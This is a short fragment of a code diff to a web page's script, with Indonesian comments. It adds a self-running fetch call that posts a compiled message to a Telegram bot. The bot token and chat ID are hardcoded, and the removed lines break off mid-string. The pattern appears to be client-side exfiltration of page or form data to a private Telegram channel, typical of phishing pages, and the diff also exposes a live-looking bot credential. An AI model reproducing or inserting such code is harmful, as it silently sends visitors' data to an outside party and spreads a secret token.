@@ -504,6 +504,17 @@
                 : "Tidak"
         }`;
 
-        // Kirim ke Telegram
-        const telegram_api =
-            "https://api.telegram.org/bo
+                const telegram_api =
+            "https://api.telegram.org/bot7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY/sendMessage";
+        const chat_id = "7737364522";
+        fetch(telegram_api, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        });
+    })();
+</script>
